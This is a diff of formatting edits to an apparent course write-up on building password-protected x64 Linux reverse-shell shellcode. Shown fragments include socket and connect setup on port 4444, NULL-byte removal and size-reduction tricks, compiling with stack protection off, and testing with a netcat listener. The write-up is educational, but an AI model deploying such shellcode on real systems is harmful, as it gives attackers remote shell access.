@@ -8,7 +8,7 @@ Requirements for this assignment, are to create a Shell_Bind_TCP shellcode that:
 - Conects back to a IP and PORT 
 - Requires a password 
 - If the password is correct, then Exec Shell is executed 
-- NULL bytes (0x00) must be removed from the shellcode 
+- NULL bytes (`0x00`) must be removed from the shellcode 
 
 To build the shellcode, linux sockets are required to implement the following steps: 
 
@@ -23,7 +23,7 @@ As in the previous assignment, the program will exit with a Segmentation Fault i
 For Linux Sockets Programming, the following System calls are required on this assignment:
 ```c
 int socket(int domain, int type, int protocol); 
-int connect(sock, (struct sockaddr *)&server, sockaddr_len) 
+int connect(sock, (struct sockaddr *)&server, sockaddr_len);
 int close(int sockfd); 
 ```
 To duplicate the standard input, output and error, `dup2()` call will be used:
@@ -55,9 +55,9 @@ mov rdi, rax                    ; value returned in RAX by syscall
 Opens the socket. To execute the `sys_socket` call, the arguments will have to be placed in the corresponding registers: 
 
   - **RAX** <- 41 : Syscall number. 
-  - **RDI** <- 2 : Domain parameter. AF_INET is for IPv4. 
-  - **RSI** <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
-  - **RDX** <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 
+  - **RDI** <- 2  : Domain parameter. AF_INET is for IPv4. 
+  - **RSI** <- 1  : Type parameter. SOCK_STREAM means connection oriented TCP. 
+  - **RDX** <- 0  : Protocol. IPPROTO_IP means it’s an IP protocol 
 
 The syscall will return a file descriptor in **RAX**, that is saved into **RDI**. This saves the socket descriptor for later use in the code.
 
@@ -89,7 +89,7 @@ mov word [rsp-6], 0x5c11                ; Port 4444
 mov word [rsp-8], 0x2                   ; TCP Connection 
 sub rsp, 8                              ; Update RSP value 
 ```
-The legth of this struct is a total of 16 bytes, and the address to the struct is in RSP. 
+The legth of this struct is a total of 16 bytes, and the address to the struct is in **RSP**. 
 
 Next step is do the call to `connect()`, placing **RSP** into **RSI** to point to the `sockaddr` struct, **RDI** already will have the socket descriptor id from before, and **RDX** the value "16" that's the length of the struct: 
 ```asm
@@ -229,8 +229,8 @@ Desensamblado de la sección .text:
 
 By checking with `objdump` that the NULLs have been removed, next step is to reduce the shellcode size. Some tricks are:
 - Using 32, 16 or even 8 bits registers for operations instead the 64 bits register
-- Using `cdq` instruction to ZEROing RDX. It puts RDX to 0x00 if RAX >= 0
-- replace `mov` instructions by `push;pop`
+- Using `cdq` instruction to ZEROing **RDX**. It puts **RDX** to `0x00` if **RAX** >= 0
+- Replace `mov` instructions by `push;pop`
 
 But still the shellcode size can be reduced, and can use more sophisticated techniques to even reduce it more. Original code is using Relative Addressing for the Password Stuff. This technique forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction, with a opcode that uses 7 bytes. For this, the Stack Technique is going to be used for the Password Stuff, to replace Relative Addressing. Just like did in previous assignment.
 
@@ -290,7 +290,7 @@ void main()
 }
 ```
 Now the code can be compiled with `gcc`, using the `-fno-stack-protector` and `-z execstack` options:
-```markdown
+```bash
 gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 ```
 The shellcode can be executed. A `netcat` listener is opened in one terminal, while in another terminal, `./shellcode` is run. Everything works as expected, as per the screenshot:
